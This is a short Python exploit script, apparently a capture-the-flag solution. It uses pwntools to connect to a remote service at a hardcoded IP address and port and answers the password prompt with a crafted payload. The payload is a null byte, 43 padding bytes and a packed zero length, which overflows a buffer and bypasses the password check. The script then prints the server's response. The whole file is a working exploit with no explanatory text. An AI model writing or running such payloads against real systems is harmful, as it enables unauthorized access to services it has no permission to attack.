import pwn
import sys


io = pwn.remote('45.76.91.112', 10051)

io.recvuntil(bytes('Enter password:', 'utf-8'))

null_byte = b'\x00'
junk = bytes('a' * 43, 'utf-8')
password_length_zero = pwn.p32(0)

input = null_byte + junk + password_length_zero
io.sendline(input)

# io.interactive()
# io.clean()
output = io.recvrepeat()
output = output.decode('utf-8')
print(output)
